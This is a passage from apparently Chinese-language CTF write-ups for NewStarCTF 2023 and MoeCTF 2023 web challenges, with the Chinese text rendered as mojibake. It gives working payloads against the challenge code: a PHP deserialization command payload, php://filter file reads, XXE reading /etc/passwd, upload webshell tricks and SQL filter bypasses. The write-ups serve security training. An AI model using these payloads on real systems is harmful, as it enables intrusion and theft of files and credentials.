$var){\rif(preg_match(\u0026#34;/[a-zA-Z0-9]/\u0026#34;,$var)){\rdie(\u0026#34;nope,this is level 5\u0026#34;);\r}\r}\rif($flag5){\recho file_get_contents(\u0026#34;/flag\u0026#34;);\r}else{\rdie(\u0026#34;nope,this is level 5\u0026#34;);\r}\r} preg_matchå‡½æ•°åªèƒ½ç”¨äºå­—ç¬¦ä¸²çš„æ­£åˆ™ï¼Œé‡åˆ°å…¶ä»–ç±»å‹çš„ä¼šè­¦å‘Šä¸”ä¸ä¼šåŒ¹é…ï¼Œä»£ç å°†ç»§ç»­è¿›è¡Œä¸‹å»ï¼Œç„¶åˆ™è¿˜æ˜¯æ•°ç»„ç»•è¿‡ï¼Œæœ€ç»ˆpayloadğŸ‘‡\nR!C!E! #\rhintï¼šR!C!E!\n\u0026lt;?php\rhighlight_file(__FILE__);\rif(isset($_POST[\u0026#39;password\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;e_v.a.l\u0026#39;])){\r$password=md5($_POST[\u0026#39;password\u0026#39;]);\r$code=$_POST[\u0026#39;e_v.a.l\u0026#39;];\rif(substr($password,0,6)===\u0026#34;c4d038\u0026#34;){\rif(!preg_match(\u0026#34;/flag|system|pass|cat|ls/i\u0026#34;,$code)){\reval($code);\r}\r}\r} å…ˆç”¨PHPæŠŠè¿™ä¸ªpasswordçš„æ˜æ–‡è·‘ä¸€ä¸‹\nè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œåœ¨PHPçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œe_v.a.lä¸­çš„ä¸‹åˆ’çº¿åœ¨ä¼ å…¥çš„æ—¶å€™ä¼šè¢«è§£æä¸ºåŒä¸‹åˆ’çº¿ï¼Œä¸‹åˆ’çº¿å¯ä»¥ç”¨å·¦ä¸­æ‹¬å·ğŸ‘‰ [ ğŸ‘ˆ æ¥ä»£æ›¿ï¼Œä»–ä¼šé»˜è®¤è¢«è§£æä¸ºä¸‹åˆ’çº¿\næ­£å¸¸èƒ½çœ‹åˆ°phpinfoçš„å†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰flag\nç„¶åæµ‹è¯•è¿‡åå‘ç°æ²¡æœ‰ä»€ä¹ˆå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°\nè¿™é‡Œå°±å¯ä»¥è€ƒè™‘å¦ä¸€ç§åŸºäºPHPçš„å‘½ä»¤æ‰§è¡Œï¼Œè¿™æ˜¯éƒ¨åˆ†å‡½æ•°ğŸ‘‡\nå¯ä»¥çœ‹åˆ°å½“å‰å·¥ä½œç›®å½•åœ¨è¿™é‡ŒğŸ‘‡\næˆ‘æ¯”è¾ƒå–œæ¬¢çš„ä¸€æ®µå‘½ä»¤ï¼šscandir(current(localeconv()))ï¼Œå¯ä»¥æ‰«æå‡ºå½“å‰ç›®å½•çš„æ–‡ä»¶ï¼Œè¦é…åˆprint_rä½¿ç”¨\nå½“å‰ç›®å½•æ²¡ä¸œè¥¿å•Šï¼Œåˆ‡æ¢åˆ°æ ¹ç›®å½•ä¸‹çœ‹çœ‹\nå› ä¸ºprint_ré‡Œçš„å‚æ•°æ˜¯æ•°ç»„ï¼Œç›´æ¥ç”¨ç´¢å¼•è®¿é—®ï¼Œç„¶åç”¨show_sourceçœ‹æºç å³å¯\nEasyLogin #\rhintï¼šç®€ç®€å•å•ã€éšå¿ƒæ‰€æ¬²\nä¸€ä¸ªç®€å•çš„ç™»é™†ç•Œé¢ï¼Œæºä»£ç èƒ½çœ‹åˆ°ä¸€äº›wafï¼Œå¯†ç æ˜¯ä»¥MD5åŠ å¯†æ ¼å¼ä¼ å…¥åå°çš„\nadminç”¨æˆ·æ˜¯å·²ç»è¢«æ³¨å†Œäº†ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªæ–°çš„è´¦å·è¿›å»ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è¿›å…¥äº†chatçš„äº¤äº’çŠ¶æ€\nå¯ä»¥ä½¿ç”¨Ctrl+Dçš„å‘½ä»¤é€€å‡ºï¼Œèƒ½å¤Ÿæ‰§è¡Œä¸€äº›ç®€å•çš„å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰flagï¼Œç½‘é¡µæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯\né‚£å°±å°è¯•å¯¹adminçš„å¯†ç è¿›è¡Œæ³¨å…¥\nç”±äºå¯†ç åœ¨bodyé‡Œæ˜¯ä»¥MD5åŠ å¯†çš„æ ¼å¼ï¼Œæ‰€ä»¥SQLæ³¨å…¥è¿™é‡Œå°±æ²¡æœ‰åŠæ³•\nåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¿®æ”¹pwå­—æ®µï¼Œä¼šç»™å‡ºä¸€äº›æç¤ºï¼Œè¿™é‡Œæˆ‘ç”¨pythonè·‘äº†ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹çœ‹è¿”å›ä¿¡æ¯\nå…¶ä¸­ç»™å‡ºäº†ä¸€ä¸ªå¼±å¯†ç çš„ä¿¡æ¯ï¼Œå¯ä»¥å°è¯•è¿›è¡Œçˆ†ç ´\nå› ä¸ºæœ‰ä½æ•°é™åˆ¶ï¼Œæ‰€ä»¥ä»6ä½å¼€å§‹çˆ†ï¼Œçˆ†å‡ºå¯†ç æ˜¯000000\nè¿›å»ä¹‹åè¿˜æ˜¯å’Œæ™®é€šç”¨æˆ·ä¸€æ ·çš„æ¨¡æ‹Ÿç»ˆç«¯\né‡æ–°æŠ“åŒ…çœ‹çœ‹å“åº”åŒ…\nåœ¨è¿™ä¸ªé¡µé¢çš„å“åº”å¤´é‡Œæ‰¾åˆ°flag\nWEEK2 #\ræ¸¸æˆé«˜æ‰‹ #\rè¿›å»æ˜¯ä¸ªé£æœºå¤§æˆ˜çš„æ¸¸æˆ\næ€è·¯å’Œéš”å£shctfæ˜¯ä¸€æ ·çš„ï¼Œåœ¨æºç é‡Œå‘ç°jsæ–‡ä»¶\nåªè¦ä¿®æ”¹gameScoreå˜é‡çš„å€¼å°±è¡Œäº†\nä¿®æ”¹åè®©é£æœºå æ¯ï¼Œå°±èƒ½å¾—åˆ°flagğŸ‘‡\ninclude 0ã€‚0 #\rphpæºç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rhighlight_file(__FILE__);\r// FLAG in the flag.php\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(isset($file) \u0026amp;\u0026amp; !preg_match(\u0026#39;/base|rot/i\u0026#39;,$file)){\r@include($file);\r}else{\rdie(\u0026#34;nope\u0026#34;);\r}\r?\u0026gt; è¿‡æ»¤æ‰äº†baseå’Œrot\næˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä½¿ç”¨filteræ¥è¿›è¡Œè¯»å–æ–‡ä»¶ï¼Œbaseå’Œrotä¹Ÿåªæ˜¯ä¸¤ç§ç¼–ç å½¢å¼è€Œå·²ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–çš„ç¼–ç æ¥è¯»å–\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªpoc\n?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\r#æ„æ€æ˜¯å°†åŸæœ‰çš„å­—ç¬¦æ ¼å¼ä»utf8è½¬ä¸ºutf16 inputä¼ªåè®®åœ¨è¿™é‡Œç”¨ä¸äº†ï¼Œåº”è¯¥æ˜¯ç›¸å…³è®¾ç½®æ²¡æ‰“å¼€\nez_sql #\rè¿›å»éšä¾¿ç‚¹ä¸€ä¸ªé“¾æ¥ï¼Œå‘ç°æ˜¯GETå‹çš„sqlæŸ¥è¯¢ï¼Œè€Œä¸”è¿˜æ˜¯å•å¼•å·å­—ç¬¦å‹\nä½¿ç”¨ group by æŸ¥è¯¢å¾—å‡ºå½“å‰æœ‰5åˆ—å­—æ®µ\nunion å’Œselect è¢«è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯å¯é€šè¿‡å¤§å†™ç»•è¿‡\nå¦å¤–è¿˜æœ‰ä¸€äº›å…³é”®å­—ä¹Ÿè¢«è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥æµ‹è¯•åé€šè¿‡éƒ¨åˆ†å¤§å†™ç»•è¿‡\nUnserializeï¼Ÿ #\rphpæºç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\r// Maybe you need learn some knowledge about deserialize?\rclass evil {\rprivate $cmd;\rpublic function __destruct()\r{\rif(!preg_match(\u0026#34;/cat|tac|more|tail|base/i\u0026#34;, $this-\u0026gt;cmd)){\r@system($this-\u0026gt;cmd);\r}\r}\r}\r@unserialize($_POST[\u0026#39;unser\u0026#39;]);\r?\u0026gt; è¿‡æ»¤æ‰äº†catã€tacç­‰å‘½ä»¤\nä¸è¿‡å¯ä»¥ä½¿ç”¨æ’å…¥æ–œæ æ¥ç»•è¿‡ï¼Œæ¯”å¦‚cat=ca\\tç­‰\nè¿™é‡Œç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²çš„phpä»£ç ğŸ‘‡\n\u003c?php // Maybe you need learn some knowledge about deserialize? class evil { private $cmd='ca\\\\t /th1s\\_1s\\_fffflllll4444aaaggggg'; }\r$a=new evil(); echo serialize($a);\r#O:4:\"evil\":1:{s:9:\" evil cmd\";s:35:\"less /th1s\\_1s\\_fffflllll4444aaaggggg\";}\ræ³¨æ„ç”±äºè¿™é‡Œçš„cmdå‚æ•°æ˜¯privateç±»å‹ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸­ä¼šå­˜åœ¨ä¸å¯è§å­—ç¬¦ï¼Œè¦ç”¨%00å°†å…¶æ›¿æ¢\r![](./images/image-50.png)\ræœ€ç»ˆä¼ å…¥payloadğŸ‘‡\r![](./images/image-51.png)\r### Upload again!\rä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œæºç é‡Œæ²¡æœ‰ä¸œè¥¿å¯ä»¥çœ‹\rç»è¿‡æµ‹è¯•ï¼Œphpä»¥åŠå¯ä»¥æ›¿æ¢çš„åç¼€å…¨éƒ¨è¢«è¿‡æ»¤æ‰\rè€Œä¸”å¯¹æ–‡ä»¶å†…å®¹æœ‰æ‰€æ£€æŸ¥ï¼Œå¥½åƒ\u003c?php ã€\u003c?è¿™æ ·çš„ç»„åˆéƒ½è¢«banäº†\rä½†æ˜¯å¥½åœ¨å¯ä»¥ä½¿ç”¨å¦ä¸€ç§scriptæ–¹å¼çš„phpä»£ç \r```\r#è¿™å¥è¯æ’åœ¨ä¸€å¼ jpgå›¾ç‰‡çš„æœ«å°¾\r```\rç„¶åå¯ä»¥ä¸Šä¼ .htaccessæ–‡ä»¶ä¿®æ”¹ç³»ç»Ÿé…ç½®\rhtaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹\r```\r","date":"2023-09-28","externalUrl":null,"permalink":"/posts/2023/09/newstarctf-2023/","section":"Posts","summary":"","title":"NewStarCTF-2023","type":"posts"},{"content":"\rå‰è¨€ #\rå¥½ä¹…æ²¡ç©CTFäº†ï¼Œç©ç©MoeCTFï¼Œå°±å½“æ˜¯æ¸©æ•…çŸ¥æ–°\nè¥¿ç”µçš„è¿™ä¸ªç»ˆç«¯çœ‹èµ·æ¥å¥½é«˜çº§çš„æ ·å­\nä¹‹å‰è¿˜æ²¡ç”¨è¿‡è¿™ç§ï¼Œé•¿è§è¯†äº†\nWEB #\rWebå…¥é—¨æŒ‡åŒ— #\rDESCRIPTION: è§£ç è·å–flag\nåœ¨MoeCTF2023ç¾¤é‡Œæœ‰ä¸ªæŒ‡åŒ—æ–‡ä»¶\né¢˜ç›®è¦è§£ç æ–‡ä»¶é‡Œçš„ä¸œè¥¿\né‚£å°±æ¥çœ‹çœ‹\nåœ¨æ–‡ä»¶çš„æœ«å°¾æœ‰ä¸€æ®µå­—ç¬¦ä¸²\næµ…æµ…çœ‹äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²\næ‹¿å»cyberchefè§£å¯†ä¸€ä¸‹\nè¾“å…¥ï¼š\n666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959\n6c396a61474673624756755a3055684958303d\nè¾“å‡ºï¼š\nflag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=\nåå…­è¿›åˆ¶è½¬æ¢ä¹‹åå¾—åˆ°çš„å­—ç¬¦ä¸²ä»éœ€è§£å¯†ï¼Œä½†ä¸€çœ¼çœ‹å‡ºBase64\nHTTP #\rDESCRIPTION: å¬è¯´è¿™ä¸ªhttpé‡Œè¿˜æœ‰ä¸ªä»€ä¹ˆä¸œè¥¿å«é¥¼å¹²ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯åƒçš„\né¢˜ç›®ç»™å‡ºäº†5ä¸ªä»»åŠ¡\nç…§ç€åšå°±è¡Œäº†\n1ã€è¦æœ‰ä¸€ä¸ªå‚æ•°ä¸ºUwUï¼Œå€¼ä¸ºuï¼Œè¿™ä¸ªæ˜¯åœ¨urlé‡Œ\n2ã€ç”¨postè¯·æ±‚å‘é€ï¼Œè¯·æ±‚ä½“é‡Œè¦æœ‰Luv=u\n3ã€ç”¨ç®¡ç†å‘˜èº«ä»½ï¼Œè¿™ä¸ªè¦æŠ“åŒ…æ¥ä¿®æ”¹\n4ã€ä¼ªé€ è¯·æ±‚æ¥æºï¼Œç»å…¸çš„X-Forwarded-Forå¤´å°±èƒ½è§£å†³\n5ã€ç”¨Moeæµè§ˆå™¨ï¼Œä¿®æ”¹User-Agentå³å¯\nCookie #\rhint: readmeåªæ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼Œä¸æ˜¯æ‹¿æ¥å¤åˆ¶çš„\nreadmeå¦‚ä¸‹\nç»è¿‡æµ‹è¯•ï¼Œç”¨æˆ·åkoitoå’Œadminæ˜¯å·²ç»è¢«æ³¨å†Œäº†ï¼Œè€Œä¸”å¯†ç ä¸æ˜¯123456\né‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªåå­—å§\nç„¶åå°è¯•è·å–flagï¼ˆè‚¯å®šæ˜¯è¿‡ä¸äº†çš„ï¼Œå…ˆæŠ“ä¸ªåŒ…\nçœ‹æ¥è¿™ä¸ªcookieæ˜¯å¯ä»¥ä¼ªé€ çš„\nå…ˆæŠŠcharacteræ”¹ä¸ºadmin\nç„¶åtokençš„éƒ¨åˆ†ï¼Œèµ·åˆæˆ‘ä»¥ä¸ºæ˜¯flaskçš„sessionä¼ªé€ ï¼ˆå¤ªä¹…æ²¡åšè¿™ç§é¢˜ï¼Œä¸€ä¸‹å­æ²¡ååº”è¿‡æ¥\nåæ¥æ‰å‘ç°å°±åªæ˜¯ä¸ªbase64åŠ å¯†è€Œå·²\nè§£å¯†ä¹‹åä¿®æ”¹ä¸€ä¸‹roleçš„å€¼ç„¶åå†åŠ å¯†å›å»å°±èƒ½ä¼ªé€ adminçš„èº«ä»½äº†\nå½¼å²¸çš„flag #\rDESCRIPTION: æˆ‘ä»¬åœ¨æŸä¸ªå¹³è¡Œå®‡å®™ä¸­å¾—åˆ°äº†ä¸€æ®µmoectfç¾¤çš„èŠå¤©è®°å½•ï¼Œç²—å¿ƒçš„å‡ºé¢˜äººåœ¨è¿™ä¸ªèŠå¤©å¹³å°ä¸å°å¿ƒæ³„éœ²äº†è‡ªå·±çš„flag\né€åˆ†é¢˜æ²¡æ„æ€\nåœ¨ç½‘é¡µæºç é‡Œå‘ç°flag\ngas!gas!gas! #\rDESCRIPTION: Kluttonè¿™ä¸ªå‡æœŸä¿¡å¿ƒæ»¡æ»¡åœ°å‡†å¤‡æŠŠé©¾ç…§æ‹¿ä¸‹ï¼Œäºæ˜¯ä»–ä»”ç»†åœ°å­¦ä¹ äº†å¥½å¤šæ¼‚ç§»è§†é¢‘ï¼Œè¿˜å‡†å¤‡äº†è¿™ä¹ˆä¸€ä¸ªèµ›åšèµ›è½¦åœºï¼›è¯¶ï¼Œä¸å¯¹ï¼Œå¼€è½¦å¥½åƒä¸æ˜¯ç”¨é”®ç›˜å¼€çš„ï¼Ÿ\nè¦æ±‚åœ¨0.5ç§’å†…ååº”ï¼ŒåŸºæœ¬ä¸Šç”¨é¼ æ ‡ç‚¹æ˜¯ä¸è¡Œçš„ï¼ˆè‚¯å®šä¸è¡Œ\né‚£ä¹ˆå°±è¦å†™è„šæœ¬äº†\nå…ˆéšä¾¿æŠ“ä¸ªåŒ…\nå¯ä»¥çœ‹åˆ°åœ¨POSTè¯·æ±‚ä½“é‡Œæœ‰ç›¸åº”çš„ååº”åŠ¨ä½œ\nè¿™éƒ½åœ¨ç½‘é¡µæºç é‡Œæœ‰\nå…ˆä¸Šä»£ç ğŸ‘‡\nimport requests\rimport re\rsession=requests.session()\rpattern=re.compile(\u0026#39;\u0026lt;font color=\u0026#34;red\u0026#34;\u0026gt;(.+)\u0026lt;/font\u0026gt;\u0026#39;)#ç”¨äºæå–ç³»ç»Ÿåé¦ˆç»™æˆ‘ä»¬çš„æç¤ºä¿¡æ¯\rdirection=0\rthrottle=0\rfor i in range(6):\rurl=\u0026#39;http://localhost:54227/\u0026#39;\rdata={\u0026#34;driver\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;steering_control\u0026#34;:f\u0026#34;{direction}\u0026#34;,\u0026#34;throttle\u0026#34;:f\u0026#34;{throttle}\u0026#34;}\rr = session.post(url,data)\rt=re.findall(pattern,r.text)[0]\rif \u0026#34;å·¦\u0026#34; in t:\rdirection=1\rif \u0026#34;å³\u0026#34; in t:\rdirection=-1\rif \u0026#34;ç›´\u0026#34; in t:\rdirection=0\rif \u0026#34;å¤§\u0026#34; in t:\rthrottle=2\rif \u0026#34;å°\u0026#34; in t:\rthrottle=0\rif \u0026#34;ä¿æŒ\u0026#34; in t:\rthrottle=1\rprint(t)\rif i\u0026gt;=5:\rprint(r.cookies) æ¯”è¾ƒç®€é™‹ï¼Œä½†æ˜¯å¾ˆç›´è§‚\næœ‰ç‚¹å°é—®é¢˜å°±æ˜¯ï¼Œåœ¨pycharmä¸­å½“å·²ç»å®Œæˆ5æ¬¡çš„æ—¶å€™ï¼Œæ‰“å°çš„å“åº”texté‡Œæ²¡æœ‰flagçš„ä¿¡æ¯\nå°±åªæœ‰æ‹¿å‡ºcookieå†é‡æ–°å‘ä¸ªåŒ…å°±èƒ½å¾—å‡ºä¸‹å›¾çš„flagäº†\nå¾ˆç®€å•çš„å†™ä¸€ä¸ªè„šæœ¬çš„é¢˜ç›®\nå¤§æµ·æé’ˆ #\rDESCRIPTION: è¯¥æ­»ï¼Œä¹‹å‰çš„å¹³è¡Œå®‡å®™ç”±äºflagçš„æ³„éœ²è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡æŠ¹å»ï¼Œæˆ‘ä»¬è„±ç¦»äº†ä¸é‚£ä¸ªå®‡å®™çš„è¿æ¥äº†ï¼ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œçœ‹èµ·æ¥å‡ºé¢˜äººå‚»ä¹ä¹çš„æ˜¯å…·æœ‰æ³„éœ²flagçš„æ¦‚ç‡çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è¿æ¥å¤šä¸ªå¹³è¡Œå®‡å®™â€¦ï¼ˆéš¾é“flagåœ¨å¤šå…ƒå®‡å®™é‡Œæ˜¯å…¨å±€å˜é‡å—ï¼‰\nåœ¨idä¸åŒçš„æ—¶å€™ï¼Œåœ¨æºä»£ç çš„è¿™æ®µæ³¨é‡Šé‡Œçš„å†…å®¹ä¹Ÿæœ‰æ‰€ä¸åŒ\nçœ‹æ ·å­åº”è¯¥æ˜¯åœ¨1-1000ä¸­æœ‰ä¸€ä¸ªé¡µé¢æ˜¯æœ‰flagçš„\nè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ä¸é‚£ä¹ˆåŸå§‹åœ°ä¸€ä¸ªä¸€ä¸ªåœ°è¯•äº†\nè¿˜æ˜¯æ¥å†™ä¸ªè„šæœ¬å§ğŸ‘‡\nimport requests\rimport multiprocessing\rimport re\rpattern=re.compile(\u0026#34;\u0026lt;!--ç»è¿‡trackerï¼Œ(.+)--\u0026gt;\u0026#34;)\rdef p1():\rfor i in range(1,300):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rdef p2():\rfor i in range(300,600):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rdef p3():\rfor i in range(600,1000):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rif __name__==\u0026#34;__main__\u0026#34;:\rprc1=multiprocessing.Process(target=p1)\rprc2=multiprocessing.Process(target=p2)\rprc3=multiprocessing.Process(target=p3)\rprc1.start()\rprc2.start()\rprc3.start() è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå¤šçº¿ç¨‹çš„æ€æƒ³ï¼ŒèŠ‚çº¦äº†ä¸€ç‚¹æ—¶é—´ï¼ˆå› ä¸ºè¿™ä¸ªç½‘é¡µçš„å“åº”é€Ÿåº¦å¤ªæ…¢äº†ã€‚ã€‚ã€‚\nè¦å¤šç­‰ä¸€ä¼šï¼Œæœ€ç»ˆä¹ŸæˆåŠŸæ‰¾åˆ°flag\nmoeå›¾åºŠ #\rDESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmoeå›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡\nä¸€é“æ–‡ä»¶ä¸Šä¼ çš„é¢˜\nåœ¨ç½‘é¡µæºç ä¸­å‘ç°ï¼Œå‰ç«¯ä¼šå¯¹æ–‡ä»¶åç¼€è¿›è¡Œä¿®æ”¹\nä¸Šä¼ æŒ‰é’®ä¹Ÿæœ‰ä¼´éšäº‹ä»¶\nç„¶åæˆ‘å°è¯•ä¿®æ”¹scriptçš„å†…å®¹å‘ç°ä¹Ÿæ²¡ç”¨\né‚£å°±å°è¯•ä¸€ä¸‹å…ˆæŠŠphpæ–‡ä»¶æ”¹ä¸ºpngï¼Œç„¶åæŠ“åŒ…å†æ”¹å›phpè¯•è¯•\nç»è¿‡æµ‹è¯•ç›´æ¥æ”¹åç¼€æ˜¯ä¸ç®¡ç”¨çš„ï¼Œä¸ç®¡æ˜¯php3ã€4ã€5è¿˜æ˜¯phtml\né‚£å°±å°è¯•å¢åŠ åç¼€å§ï¼Œç»“æœå°±æˆåŠŸäº†\nç„¶åè¿æ¥èšå‰‘ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å¾—åˆ°flag\näº†è§£ä½ çš„åº§é©¾ #\rDESCRIPTION: ä¸ºäº†æè‡´åœ°æ¼‚ç§»ï¼Œæˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªç½‘ç«™ç”¨äºæŸ¥æ‰¾ä½ å–œæ¬¢çš„è½¦è½¦ï¼›å¬è¯´flagä¹Ÿæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡ä¸åœ¨ç½‘ç«™ç›®å½•æ”¾åœ¨æ ¹ç›®å½•åº”è¯¥æ²¡é—®é¢˜çš„å§ã€‚ã€‚ã€‚\næºç é‡Œæ²¡ä¸œè¥¿ï¼Œå…ˆæŠ“ä¸ªåŒ…\nå¯ä»¥çœ‹åˆ°æœ‰xmlæ ¼å¼çš„å†…å®¹\né‚£å°±å°è¯•ä¸€ä¸‹XXEæ³¨å…¥å§\nä¸€èˆ¬æ¥è¯´å¸¸ç”¨çš„XXEä»£ç æ˜¯è¿™æ ·çš„ğŸ‘‡\n\u0026lt;?xml version=â€1.0â€³?\u0026gt;\r\u0026lt;!DOCTYPE a[\r\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\r\u0026lt;abc\u0026gt;\u0026amp;xxe;\u0026lt;/abc\u0026gt; ä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œ\u003c?xml version=â€1.0â€³?\u003eè¿™ä¸€è¡Œå¥½åƒä¼šæŠ¥é”™ï¼Œä¸è¿‡åˆ äº†ä¹Ÿæ²¡å…³ç³»\næœ€ç»ˆä»£ç ğŸ‘‡\n\u0026lt;!DOCTYPE a[\r\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\r\u0026lt;xml\u0026gt;\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\u0026lt;/xml\u0026gt; å¤ºå‘½åä¸‰æª #\rDESCRIPTION: å¤ºå‘½åä¸‰æªï¼ç„¶åæ˜¯å•¥æ¥ç€ï¼Ÿ\nçœ‹æ ·å­åº”è¯¥æ˜¯ä¸€é“ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„é—®é¢˜\nçœ‹çœ‹é‚£ä¸ªåŒ…å«çš„æ–‡ä»¶å‘¢\nå­—ç¬¦ä¸²æ›¿æ¢çš„å‡½æ•°ï¼Œæœ‰å¾ˆå¤šå¯ä»¥é€‰æ‹©\næœ€ç»ˆè¦è¾¾æˆSpear_Ownerä¸ºMaoLeiå°±èƒ½å¾—åˆ°flagäº†\nå¦‚æœæ­£å¸¸æ²¡æœ‰æ›¿æ¢ï¼Œå¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å°±æ˜¯è¿™æ ·\rO:34:\u0026#34;Omg_It_Is_So_Cool_Bring_Me_My_Flag\u0026#34;:2:{s:5:\u0026#34;Chant\u0026#34;;s:15:\u0026#34;å¤ºå‘½åä¸‰æª\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;Nobody\u0026#34;;} ä»index.phpé‚£é‡Œçœ‹æ¥ï¼Œæ˜¯å…ˆç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢\næ„æ€å°±æ˜¯Chantå±æ€§çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯ä¸ä¼šå˜çš„\nå‡å¦‚chantä¼ å‚di_yi_qiang\ré‚£ä¹ˆå¾—åˆ°\rO:34:\u0026#34;Omg_It_Is_So_Cool_Bring_Me_My_Flag\u0026#34;:2:{s:5:\u0026#34;Chant\u0026#34;;s:11:\u0026#34;Lovesickness\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;Nobody\u0026#34;;}\rå¯ä»¥çœ‹åˆ°di_yi_qiangï¼ˆé•¿åº¦ä¸º11ï¼‰ï¼Œè€ŒLovesicknessï¼ˆé•¿åº¦ä¸º12ï¼‰ï¼ŒæˆåŠŸé€ƒé€¸å‡ºä¸€ä¸ªå­—ç¬¦ è€Œæˆ‘ä»¬è¦æ„é€ çš„ç›®æ ‡å­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„ğŸ‘‡\n\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;MaoLei\u0026#34;;}ï¼ˆé•¿åº¦ä¸º35ï¼‰ ç›´æ¥ä¸ŠPayloadğŸ‘‡\nhttp://localhost:52707/?chant=di_er_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiang\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;MaoLei\u0026#34;;} meoå›¾åºŠ #\rDESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmeo(?)å›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡\nä¸€é“è¡¨é¢ä¸Šæ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¢˜ï¼ŒçœŸçš„å¾ˆå®¹æ˜“è¢«å¸¦åğŸ˜«\nç»è¿‡æµ‹è¯•ï¼Œæ­£å¸¸çš„å›¾ç‰‡ï¼ˆå›¾ç‰‡é©¬ï¼‰å¯ä»¥ç›´æ¥ä¸Šä¼ ï¼Œå¦‚æœæ˜¯PHPæ–‡ä»¶å¸¦äº†GIF89aæ–‡ä»¶å¤´ä¹Ÿå¯ä»¥ç›´æ¥ä¸Šä¼ \nä½†æ˜¯èšå‰‘æ˜¯è¿ä¸ä¸Šçš„\nå› ä¸ºè®¿é—®å›¾ç‰‡è¦é€šè¿‡å¦å¤–ä¸€ä¸ª images.php æ¥æŸ¥çœ‹\nè€ŒæŸ¥çœ‹å°±ä¼šæ˜¯è¿™æ ·\næŠ“åŒ…çœ‹æ•ˆæœä¹Ÿæ˜¯ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ‰§è¡Œ\nè¿™é‡Œç”¨images.phpå°è¯•å»è®¿é—®ç›®æ ‡ä¸»æœºä¸‹çš„å…¶ä»–æ–‡ä»¶\né…åˆç›®å½•ç©¿è¶Šï¼Œèƒ½çœ‹åˆ°upload.phpçš„æºç å¦‚ä¸‹\nå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ åè¢«åŠ äº†éšæœºå‰ç¼€ï¼Œè€Œä¸”åªèƒ½é€šè¿‡images.phpæ¥è®¿é—®\nè€Œimages.phpçš„æºç 